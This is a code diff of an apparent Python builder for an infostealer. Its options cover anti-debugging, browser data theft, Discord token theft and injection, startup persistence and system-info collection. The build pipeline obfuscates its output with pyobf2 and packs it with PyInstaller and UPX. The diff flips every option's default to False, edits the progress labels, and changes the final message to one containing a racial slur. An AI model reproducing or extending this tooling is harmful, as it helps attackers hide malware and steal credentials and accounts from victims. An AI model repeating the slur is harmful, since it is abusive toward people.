@@ -5,7 +5,6 @@ import shutil
 import subprocess
 import traceback
 import zipfile
-
 import colorama
 import pyobf2.lib as obf
 import requests
@@ -32,37 +31,37 @@ class Config:
                 "type": "confirm",
                 "name": "antidebug",
                 "message": "Enable anti-debugging?",
-                "default": True,
+                "default": False,
             },
             {
                 "type": "confirm",
                 "name": "browsers",
                 "message": "Enable browser stealing?",
-                "default": True,
+                "default": False,
             },
             {
                 "type": "confirm",
                 "name": "discordtoken",
                 "message": "Enable Discord token stealing?",
-                "default": True,
+                "default": False,
             },
             {
                 "type": "confirm",
                 "name": "injection",
                 "message": "Enable Discord injection?",
-                "default": True,
+                "default": False,
             },
             {
                 "type": "confirm",
                 "name": "startup",
                 "message": "Enable startup?",
-                "default": True,
+                "default": False,
             },
             {
                 "type": "confirm",
                 "name": "systeminfo",
                 "message": "Enable system info?",
-                "default": True,
+                "default": False,
             },
         ]
 
@@ -213,10 +212,10 @@ def main() -> None:
     colorama.init()
 
     progress = Progress(
-        TextColumn("[bold purple]{task.description}", justify="right"),
+        TextColumn("[bold purple]{task.description}", justify="middle"),
         BarColumn(bar_width=None),
         SpinnerColumn(
-            spinner_name="monkey", style="bright_purple", speed=1.0),
+            spinner_name="monkey", style="", speed=1.0),
         TimeElapsedColumn()
     )
 
@@ -224,30 +223,30 @@ def main() -> None:
     config_data = config.get_config()
 
     with progress:
-        task1 = progress.add_task("[bold purple]Making environment...", total=1)
+        task1 = progress.add_task("[bold purple]Making environment - Step 1", total=1)
         make_env = MakeEnv()
         make_env.make_env()
         make_env.get_src()
         progress.update(task1, advance=1)
 
-        task2 = progress.add_task("[bold purple]Writing config...", total=1)
+        task2 = progress.add_task("[bold purple]Writing config - Step 2", total=1)
         write_config = WriteConfig(config_data)
         write_config.write_config()
         progress.update(task2, advance=1)
 
-        task3 = progress.add_task("[bold purple]Obfuscating...", total=1)
+        task3 = progress.add_task("[bold purple]Obfuscating - Step 3", total=1)
         do_obfuscate = DoObfuscate()
         do_obfuscate.run()
         progress.update(task3, advance=1)
 
-        task4 = progress.add_task("[bold purple]Building...", total=1)
+        task4 = progress.add_task("[bold purple]Building - Step 4", total=1)
         build = Build()
         build.get_pyinstaller()
         build.get_upx()
         build.build()
         progress.update(task4, advance=1)
 
-    print('Done!')
+    print(f' Aeares Made this shit my niggalo')
 
 
 if __name__ == '__main__':
